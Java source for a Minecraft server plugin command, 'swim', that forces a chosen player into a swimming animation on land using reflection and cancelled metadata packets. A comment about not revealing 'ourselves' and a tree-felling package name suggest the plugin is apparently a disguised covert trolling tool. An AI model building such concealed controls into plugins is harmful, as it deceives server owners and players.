package me.bow.treecapitatorultimate.commands.Player;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.CraftBukkitUtil;
import me.bow.treecapitatorultimate.Utils.Packet.Packet;
import me.bow.treecapitatorultimate.Utils.Packet.PacketEvent;
import me.bow.treecapitatorultimate.Utils.Packet.PacketInjector;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.entity.Pose;
import org.bukkit.event.entity.EntityPoseChangeEvent;
import org.bukkit.event.entity.EntityToggleSwimEvent;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.UUID;

@Command.Info(command = "swim", description = "Player will have swim animation, even on land!", category = CommandCategory.Player)
public class Swim extends Command {
    private final ArrayList<UUID> players = new ArrayList<>();
    private Field entityId;
    private Object swimmingEnum = ReflectionUtils.getEnumVariable("{nms}.EntityPose", "SWIMMING");

    public Swim() {
        PacketInjector.addPacketListener(this);
        Field[] fields = ReflectionUtils.getClass("{nms}.PacketPlayOutEntityMetadata").getDeclaredFields();
        for (Field f : fields) {
            if (f.getType() != int.class) continue;
            f.setAccessible(true);
            entityId = f;
            break;
        }
    }

    private void setSwim(Player p, boolean swim) {
        if ((p == null || !p.isOnline()) || p.getGameMode() == GameMode.SPECTATOR)
            return;
        Material m = p.getLocation().getBlock().getType();
        if (m == Material.WATER || m == Material.LAVA) return; //let's not reveal ourselves
        p.setSwimming(swim);
        try {
            ReflectionUtils.getMethod(ReflectionUtils.getClass("{nms}.EntityHuman"), "setPose", ReflectionUtils.getClass("{nms}.EntityPose")).invoke(CraftBukkitUtil.getNmsPlayer(p), swimmingEnum);
        } catch (IllegalAccessException | InvocationTargetException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onServerTick() {
        for (UUID i : players) {
            Player p = Bukkit.getPlayer(i);
            setSwim(p, true);
        }
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        try {
            Player anotherPlayer = Bukkit.getPlayer(args.get(0));
            if (anotherPlayer == null) {
                Start.ErrorString(p, "Player is not online!");
                return;
            }
            if (!players.contains(anotherPlayer.getUniqueId())) {
                setSwim(anotherPlayer, true);
                p.sendMessage(Start.COMMAND_PREFIX + ChatColor.BLUE + anotherPlayer.getName() + ChatColor.GREEN + " is now swimming!");
                this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " enabled swimming on !" + ChatColor.GOLD + anotherPlayer.getName());
                players.add(anotherPlayer.getUniqueId());
                return;
            }
            p.sendMessage(Start.COMMAND_PREFIX + ChatColor.BLUE + anotherPlayer.getName() + ChatColor.RED + " is now longer swimming!");
            this.Notify(p, ChatColor.GOLD + p.getDisplayName() + ChatColor.GREEN + " disabled swimming on !" + ChatColor.GOLD + anotherPlayer.getName());
            players.remove(anotherPlayer.getUniqueId());
            setSwim(anotherPlayer, false);
        } catch (Exception e) {
            Start.ErrorException(p, e);
        }
    }

    @Override
    public void onEntityPoseChangeEvent(EntityPoseChangeEvent e) {
        if (!(e.getEntity() instanceof Player) || e.getPose() != Pose.SWIMMING) return;
    }

    @Override
    public void onPlayerSwimToggle(EntityToggleSwimEvent e) {
        if (!players.contains(e.getEntity().getUniqueId())) return;
        if (e.isSwimming()) return;
        e.setCancelled(true);
    }

    @Override
    public void onPacketSend(PacketEvent e) {
        if (!players.contains(e.getPlayer().getUniqueId())) return;
        Packet p = e.getPacket();
        if (!p.getPacketClass().getSimpleName().equalsIgnoreCase("PacketPlayOutEntityMetadata")) return;
        try {
            if (e.getPlayer().getEntityId() == (int) entityId.get(p.getNMSPacket()))
                e.setCancelled(true);
        } catch (IllegalAccessException ex) {
            ex.printStackTrace();
        }
    }
}
